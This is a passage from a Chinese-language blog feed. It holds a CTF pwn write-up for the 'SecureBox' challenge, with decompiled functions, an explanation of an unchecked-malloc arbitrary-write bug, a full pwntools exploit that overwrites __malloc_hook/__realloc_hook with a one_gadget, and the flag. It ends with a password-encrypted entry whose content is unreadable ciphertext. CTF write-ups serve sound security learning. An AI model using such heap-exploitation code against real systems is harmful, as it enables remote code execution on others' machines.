class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v3 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) &gt; v3 ) <span class="comment">// *((_QWORD *)chunk_array[v2] + 4) is large here</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">        v4 = *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) - v3;</span><br><span class="line">        v5 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( v5 &lt;= v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            read_data(*((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">            v6 = *((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; v5; ++i )</span><br><span class="line">            *(_BYTE *)(v6 + i) ^= *((_BYTE *)chunk_array[v2] + (i &amp; <span class="number">0xF</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Show</code>功能打印给定<code>index</code>对应chunk中的数据chunk中的数据，根据提供的<code>offset</code>和<code>length</code>。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST10_8</span></span><br><span class="line">    <span class="keyword">void</span> *dest; <span class="comment">// ST20_8</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 n; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v3 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( chunk_array[v3] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) &gt; v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">            v0 = *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) - v4;</span><br><span class="line">            n = choice();</span><br><span class="line">            <span class="keyword">if</span> ( n &lt;= v0 )</span><br><span class="line">            &#123;</span><br><span class="line">            dest = <span class="built_in">calloc</span>(n + <span class="number">32</span>, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)(*((_QWORD *)chunk_array[v3] + <span class="number">3</span>) + v4), n);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li>先利用unsorted bin来leak出libc的地址。</li><li>之后关键利用点就在于：<ul><li><code>Allocate</code>功能：其中<code>Allocate</code>的对size的检查逻辑<code>if ( size &gt; 0x100 &amp;&amp; (unsigned int)size &lt;= 0xFFF )</code>使得size可以是形如<code>0x00FFFFFF00000000</code>的很大的数，而进行相应的malloc操作时，会因为size过大而返回NULL也就是0，但是并没有对malloc的结果进行检查。</li><li><code>Enc</code>功能：因为<code>*((_QWORD *)chunk_array[v2] + 4)</code>可以很大（就是输入的size）且<code>*((_QWORD *)chunk_array[v2] + 3)=0</code>（malloc返回的结果），加上没有对<code>*((_QWORD *)chunk_array[v2] + 3)</code>的检查，所以在控制offset为任意地址的情况下，即可以实现向任意地址写任意数据。</li></ul></li><li>根据上述漏洞，首先<code>Allocate</code>一个size为<code>0x00FFFFFF00000000</code>（覆盖所有地址均可）的chunk（返回0），记录生成的<code>key</code>。</li><li><code>Enc</code>前一步申请的chunk，<code>offset</code>设置为<code>__realloc_hook</code>的地址，length的值为0x10。</li><li>将<code>(libc_realloc + 10) &lt;&lt; 64) | one_gadget</code>用<code>key</code>加密（逐字节异或）得到payload，将payload作为输入的data，这样可以将<code>__malloc_hook</code>写入<code>__libc_realloc+10</code>，<code>__realloc_hook</code>写入<code>onegadget</code>，目的是调整栈以满足<code>[rsp]+0x70</code>的约束然后打<code>onegadget</code>。（这里这么做是因为直接改<code>__free_hook</code>为<code>system</code>打不通，直接改<code>__malloc_hook</code>也满足不了约束，所以用<code>__libc_realloc</code>来调整栈。）</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'39.97.210.182'</span>, <span class="number">19806</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall_2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, offset, length, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"Msg: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, offset, length)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.recvuntil(<span class="string">"Msg: \n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(content, key)</span>:</span></span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        value |= ((content &amp; <span class="number">0xFF</span>) ^ key[i]) &lt;&lt; (i * <span class="number">8</span>)</span><br><span class="line">        content &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p64(value &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(value &gt;&gt; <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x1eab80</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10afa9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># chunk 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x60</span></span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># larget size</span></span><br><span class="line">add(<span class="number">0xFFFFFF00000000</span>) <span class="comment"># chunk 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">p.recvuntil(<span class="string">"Key: "</span>)</span><br><span class="line">keys = p.recv(<span class="number">48</span>)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(keys), <span class="number">3</span>):</span><br><span class="line">    print(keys[i:i+<span class="number">3</span>])</span><br><span class="line">    key.append(int(keys[i:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">edit(<span class="number">2</span>, str(__malloc_hook - <span class="number">8</span>), <span class="number">16</span>, enc(((libc_realloc + <span class="number">10</span>) &lt;&lt; <span class="number">64</span>) | one_gadget, key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">success(key)</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><code>flag{4b03fb45856021f3415e6451f6cf855d}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn rop: unexploitable</title>
    <link href="https://n0nop.github.io/2020/04/17/pwn-rop-unexploitable/"/>
    <id>https://n0nop.github.io/2020/04/17/pwn-rop-unexploitable/</id>
    <published>2020-04-17T15:49:50.000Z</published>
    <updated>2020-04-17T16:25:53.199Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5d3a78db7c708e1ce4180eb585a0da962673d55282d2cb8b1b9f3501326392c2">38bf8027d912094e8938c5662d33e384a0f4d8f5ffa6b6d9ee515bf7a8e8b4b8c26bd69bd9221b532ff090f710d592fabc35f59964522c3e212cb2bbb02c98a0bf189a0778905ab758d87ac0a88397599cf5ce11655907570f46cdbd223bd0cc8d3835095b039612b260a493c53057ebc13e232a8e3bab8148b438a3eb3633d869bfad2d2891fcbd3afb11c23e464801811587d58011922eb61a035edf3cce376451c9c4ade4bb90e2919b15c78d1f516767ed4c933249effbc21e641aa1f2e6b80fbe7714a3205f4ec0379a6808abcbb3390592bbb52fe32645786dfdea0b058c68e9b7488d8b6fbaf8438eecf51ec4a24e54d7f07ed5a50d76fdae7c2a883319a0d342b44e748e0f5225e4165c67366ccada07c1e3b779e8f0b742a90872838bffbad99947a061b9fff7f122507ed709d1d12e72057ef6d70295e31491aaa119fbabb83a75b6d5a17d0ca1b81fff624339990a5a4f23e1f0eb9aeb13924030f3dc4c58ec2aef0e86fe35694257dbfd661cebea152496d163124af146d8650d026e2d570c3d16b173f9e8b7f9d4e8f8794f09b28b2b4aca9646539583a09e82123462f838012b89105c73128fe1f67d38fc288979ac0c4cab86f2550cd18cd3144fd91808ce3e4528f4e26fb39b0b67d0f109ea8d039b39f5b4cb658f24e1a1e60b27809f2190b1047310f51dbdc42da0dfe40efc774da8a29a50655477a9fc3813de3d2dd506b46f71d521d935fe1bb954f5d099161ec927e4ea4447646ff6d04db874f05e1ff075752fe52212a9eaa04dee14d0453bb2b9b62e7c1dcb642d5a3ec97b5b126fdd29029c79cde8ff02bb406b5b1ba08d71ec1aa6d20bef3312efa5b9f1323e726de978fdca552671e461ab10646ec6cce4b47c9c29b0880e3fb6e583b637cbf458a624ba898652a2ff2735b04f5b3784dc229677be17246ce7387e444bd2f7cd26f88c7e9d0008ef800f1597225820f0bda043055f8933be9e91bfadf239b348bf79aa4ac35c6dfd07ecf62a2a25b24215134ad7640d764c516d8e6bac2ce90daffd49edd69ba83cc6fade233b2345664ecb78f856cd9c995f774cd24a4ba796cb2a59eb8960c1c2db065b6a63bc1457d9f11ecead7b6a661a34d12a2aacbb1e26dfca209dfc4c92bd81b6031fbedf3ee819ce82b90a55ad126bb6daf3ef08697921a114934a3844d8db64985ef61a1469ebbaec30d6d9823baed16f50255456b2835dd55038ed2e94ec592490d60f1d540f8974ebe587efa6a23684d38cf2be3cf9f48412d43ee9c1254267f1fe571772d880b0e5f3aba05c901a8d3baaaaddab07b92bcde68666b91a9068e2f72b6aca9bb2a7bd1ae94ce7728900173e399cd6190428359e60d2d6ab9719e36bf90a80c1c959f94e3f1f9d0b19fb7a9903cfdb81d08d326cf7c5ea2ab2000e7c3be0c7106cbde06cee6762818c33911788b78f4eadf16e4339580155b309acb2337f54a24575a9b557f78954f466e09f9893ba50422bd0ff32dc7c942af7c7cce118a78690d6779d99d5ca534e2149ad4d2aa70082ac0e60250f6642b7625d40a9c1d066bf3a5067aa5463fecb992063dfb88619374260c44e7c66d3d5d638ecc4cebd50601d755c4e30801ed9217596969d1178a97780e475cfd214befbd3c81f5ae597b2817828b4395e935d3b1b8f26674516620c646efd954841718c55a009923e30f552fd3fdf3172f7a58a9fa47f56814184db07bb1eabc4fda56875b9e9d7ca713fa9fd7fd9fd8257eed3437b58168c9fbdde3669596d9af8da5a342ea020097ef0dc014ae4b9839de27e4aad38199be944a42547b51575ae79685525aed241ffc78427ce25522be59eb0d00dbbef0e1f000698388c5ef968981ad0b09cb538419cd800195c12b2ae7b803a3a111e5f77b3df47cb97ff7566e3b2fc27aa1e0e1e8e56edc262a55ca74b31bbd925f68631b673dfd08b886ec99728f10aed0098df887fbf9ff6dac12d6b7ddcfe63f3e35611e8d929c7aac91829c44cb968f0725090f6f8a60a38f0dcd4a45a5c7f9baf6e7adfaa7d89797e8795d1caabb5691a59131a830128819ab1acf26cf2e797c3426ec7c4265c02610fcbb97ff24897439cfd8d0d00894a5707997c12ca6ef3ee7fb88573d1848bd70f670e114740fea4c22f380ef7ebaf3c9c2fba219d69c3fd1b0a361db96719a1b854d6ad4fc38f5c10e79eace7a95a6cb5ce7e868a034d453c3fc5aab05d216de3d255494960dd7214b2b97af7e08021a8c9cae5c8daceaf50621f2cce7225ebbcb6beeb3660411ff5c29610a82699048d4a0097d506b229f49b8c6f0aca2c455f956b745afcab13224bcc30cf0c137b45e12788ac4f6f762d1e891e52d8ca4dc8ea55036dd637693634c52cdc42e8d228a6e22d18a1a7089a5317978182bb8093c191ac7251b118aa5fec83ff0ff38bdf16e414597a07465af12ab30f70493a5d04bf406b9fd779c56c7826b8856a10013092da01ec62241550f33d868999de805a82c88eb6462811a973f6c0d4bdc3b29526a67e504d1d07c60c71fe83a227d82d1981b0b7bb62b76b54f8968d7766162589a2137a6ce0e6bf7f6749e2a1cc7cd29189584fae1400550d8ab7187acf3fdecee4b688432cb347e9634b99343642c44fd57a8ab79f24c99f475d101d8f2b91139ac9c1bf22aeabdb80217264da6a31cda35b412c2d42b5c345d85d09b7d536dfa12ad07a8eecf4b2c4bb14c13a37c43b7e43b4cb74a7994d5e10e6a5bcd5ba3688e623d481e655f678abeec0229126918ed562216cce9c307ea4a59412deaca5c7cfb2ee0abc2c16e2f4eafeb0f14f69ac38901eab192db2760e42b4fb25246ab8a4b697ce5c347d316c51ec0a184315e70fc386774da639cd3c01b7de3df50410c798f7399530be3dbb98984014b64ec51ec80a9012500342c4a583de640ec6fab77a269c1e779cbdecf04b47edfe313fc7e65dffb449eb9fca80b3c1931a118a60c9192774d9c5f2c429149feec466956bad4e1d82c6396410c7bf1e23b98258c410ede6a8828e123587526db6fc43ee67ced61603f8458b6d36c2871cd2a8e11cb60c77258b2cf3cec659299ec3ddec94cdd4d678e5e0a825cfe9b09ab19c05ebae8bd24e935afca3da22f1b482f74bc3ec88098e40efaac93dc14b5c824836b64ec3e7a5d364fb441de5d2adaaa5ee9090d0057355fb486cc0d7240770ffbe5401afa5c53ccd61dd02b739c1c94326daaac8215f5f4e8842eb97c413ce46337567c29585d1e2dab103d9a1f36d2a5b47c9d18dd8f1e4db08440c79a16d762a647e60fa9a1469d91746924697f07e5b99c7b16b273be70a50d00d162e060c4cf787e719fee614755ac59a0ce5bc405fd0c681808d5d4a6d62d14d6bb54211f261a228d7f947099526920a44d49b75edb32d83f3894009851c04482bbc56d884978f4d993b2574fbe8cfa9e50034eeab33f8c1f5c5d055fabfa0bdf1abf4f5046b83f7eaecb9689ee611e25078b80c19803ff29e46d4dea1114cda834f3811d2779a337b7c2081fc21b22e6c962b873137560dd56c721d530c481642b35446b3a82467fc65f4eae7278cae326702baf8c96762707e5bd554b5cf92028d7085de359ad458387bf88c56b34b552ffe4d876ed176fcd044ccab0db846630e31bf53fffc882d1a60daac439cbbeb8ee55d7e5a42acbada6c2dbf6890c29ad781387ce7d3d6f5b80f48a865b424973248307f5868ce191facec47bfa064e8b2656510c8d91e30b3f89c0c10560b1437f2acf8744acd5e0082726a170f26ce315876da4e8f4b811d9e04876c574d654c87035eb3aaa49e93aa0d2ed51ebb63d27f3422c8c8ac71a77501b136bf1032a7ad50d7193ed990a0b887449b820c1da2a0a7b5bd1c45f36f9e5ba1237a80bd3c8819ff6c96a801196dec48f8f6589c33d4b51fdade001aeb93cc04174ef6b24e159ab04ba31846739da7096388968c8dc9f0d2a536f9c80c4387b3ae9dd9294420563d9178c5555839ea591f958d2650b2c228d1fd3f75eaa38f7cec9a9c4b7ac1c1e08b1dd2f0e1dd64df49e133b3184a212305ae443a612c6eccd82ad065ca863c6368da1b02d5b7e2373a7e5d478c89239f5817bf5d6685e499e416609aace14795c1ba5535c532622a9d9b464c467bea68a1b11707cdb7e9776a2d116f65406b48a83c56419e07601aa4b39b2cf462ced80bcd736be28fc88d724b3c302f8127195ec27623b2636b4ac631a08d17ffc2b8a6f2eba3710c5e8db61aa821181e05dd27ea97e4dea93da5a50233df628e663a390f79933e5d959b7e089e3c9f003d8639c417e1b3e7c95f38c7d332b4ade9cd8687e35f61761d61e61e5178a9fc42c4bbd42808d5cf16286b82e550e9d9a176d5755bd5e96c5223ea5e36b08814af5a1dcae43dfea1e4eb42589d6f6a3dabd596a7e93dee9517a5b6b95ba865814e388129dcabe0545678bcdfcff1f1f72ad6e973c864f9b1d3e303f36101348b776d9a3c99e4247be78ac426c27f9c8dd84b8066db19cb865221d07e81d212ee9dede012e2659d5bc8485a1423012c5afe3a0dcd7b5f4ccfa73a31d9a2bb2311df000a51b4ac903dd9dbaef48c1b813c5345426855a67a3faeaac7e132d7658572d202949ede9a1cc469c3eeced381829be6145d56ffca3e037cc37c115b6ebaa1fbe4e3ea241384e388a18750cc0ddf8aca5c20453438e423022f23535cf1e7f55bb24fe98412d1b31985d3512ca432fd12aed3cabc13c06b0a75a5199a264f5dfdd6549f0e5f5a17d4f3b80c86d43e2e47ea433ef29385e3f45476831da7a6fbc66a631343f8ef765b03ca0d49473ba5e60e5b6787729325eb8d70afa2adec119a91e6ccbe2d6197c42f6f916e69a94d992f543f44429f7f71277f51aea5feba26c94ffd94feaa78031055ab2b377a52bf8004998afa9d94a5d085bb879da4bc5df0a581b392f79bc2f508d15e36f108f9763893c8ea3dca834ee0ea867b6b6cec94df8e8351709ed16769a6648111c84d1ffbd17071d3e250de40a32cafc15fa392538c1ade570b499d0c824e59f9b6b45864c4090647640fffe1ec73709f7cbfe9cf99138e062ec85ebcb7306c743ca789f5979da440ee566db91fd9516647db711edeee1241d7d73cfbd0698e80d522dd5043a1bd30fda00c21c08b0b5517ce0086861623bbe63f9c3d78de5de162c2d6cd5e0df0a69dc959b977f1c0f48eaf63c1c208efa02d7c815dc652f2419b6d0fe34d5a1f63b4240c28861b6fda02258a716af2091171bba6c7dc6f4870f7edce7ec4689b137b527ef01111d518b24d57cc219c686c0cf53191dd6d4a8ccdb97fba880f704d0217cf3d3b652e1c00346f8e27c2691c38993b5ca27faaa22222c51d77bc50c2033a2d84600b343402cc1a5cb0939c63d400dd8d0e01a5b78bde34981a7e63fcb3734dc304faa4c8ab457711df80f8ff30d3f69c651303795aad9f790e511bee0bdf3c62525aed7d7924ca30ce2961ddd2f85cf3f95dcffa53946ec9b1741079ae271b7040b8601e6d8f613338c0233409cd6b1727621174fb974bba1f6c2dbb41f9d5219d615b25d7a6e31d958cc784f4a7393734b6446c940d45ee0febf2f7f0efcd394a0c5ed1813f81b4ede6864e4220e30e2b12d3a9636ce8226232fa92c13712a8747d4c5f57605f9e2a972bfd94ee3e16bbb0f173b35b864aa73f850769053f5391b4a19a7ee69eed3b97164e0b73b22fdefd79d75ce6148c7a02a92bf221ecf7a7c36e827c518fbde7e5fbbd36feebdf78be5eb815f80b14d90e9e1428b9a66d291be8587a27c9371d3834abe551a87c9dc956fd5b7442af85beb621bc3f1c5feadbe1c41a72a6a93502905e90a8bd161e710e6bec4c9b8f8836580bda5f15cf88233d0a6503da5e803f0a96fb83c1fb8691b8a6f4ff0bdee8609e952b8381202d57391f917fd87735b0a03d94c683da753df5589ad5f3601b1dc9d494893a6a16591accdfc4e1d766226a82b06afdf4d530dad5ff008e6a302d9ca96e8239015cd30898eba11d30ebb5166f899f6467176d0f80998a23c6618f2dbcb1c273d937dc434e2db3cede4f12de3bbf6839b43fac6baf5de8de9b026bc96884aa1b619c4b31ba1254b446ed369ccc5544f5ae907bbb9373bf2c91eb4df25173340db31eb844192ffad57c4f2534c17c89229b7454c541b5470b76a0e73ee223fef3e118c529d83ef878d1056b85b52fbbd4e4f0228b9b47da1ab6b0bd2c0218b3969efa7af273ae0faf517ea78c360aec18d525d7c07fb9402ce1bd10b87349ee28b24742e6300fdf06ca5b64da4f7a4dd396eba363290c6e18c1e5b303cc1ba4e8f25b985b67c402467e382db6ca31d5f56b715c38ec924f2ff73a55f3cf6abbcdeabbe88a71a119056d1ab9437a2b41449a87011844bc5388cf0c8fb1597cfdcdf0c70a2d795bc15bd8e612527c91f6390fabfe7d1c825fbaf5b98b716e137a0730703f3dafbd660b5bc6397a7a7e99558e558d38f4c05cefd508ddf650a3c4678166491ee6a35064858792e946cf6a394b91f3607731c403d664d959adb56e4ff4b3d3277fb18f48c1f16addde36e69f725a4104928480113fd3d604b26d8d04e3a0330844885a42e150c401f12e0130c5e4ffb7ad0ed411e4ea249112fc9193ec964ff4a6f100b7fd66e6bfc98199a18983e96f219453c660279bafe53906a45a82c84ec5732d809cb515ae856308c521fdd86ea44003772a286f7322d3bc00d4c19d4b6dc64c54a610cfdd9de3dcf2d579af5c184ac241bbffc4be29761a59821e7ba7eb4720d7e69a5151bee67998f313096eefe48360afc9dc1f576b0ef61f1ce9093f1b15bdf54260d5bfd8378aebdeaa0309ca4d6f02319da6f4babc0ffed1c1eaade722b03ed8753381f48ac2ddb94fcfe13da5f5709b9d93037df59d4b5d7df3d45199b1ffe1a9f6cc2e8d35433310d2307862e580738500ec888c6772da75ab1ed98279a180eee15dc6102680df116a6cf6af5d94924399808a6a30c9d13ec1aa5a1e9c0949a281669ee6abd6ee7b751eabf41a0d368a6050f750e47e588bbb40a9d2ab918e15ea529e7c719d2899e52fcd2d055199393ca42021772d16eaa8280b37310ae1f618874dffa61efafdf9f82a522256df8267190c5a6a78c10fdcf5ea8f36d372250abc2929ba7e425698a2135cba9b033d1027be57c7eaf29d90b99a2b3f6163ea18aefa006ac532a63e0340ab12a29fe15be916c33aff9c7144d27541bbfe21f83a05164cf5d79590daed62a85d39f985988cede33971da0cbba6de45f128430c4d9266f9dcdda10120580b82dcc13240d9c26918726724c871527f378abdac774255372c0d484935e4c7daae047cca91b6303548805792b2da5db2ba347178b61a2e13e1a76108fc7f6c5b2cf33c158d9653c7c94226af7222d91736a555d9f0ba79377ad33152ae6c8ae413e9d9af854403f33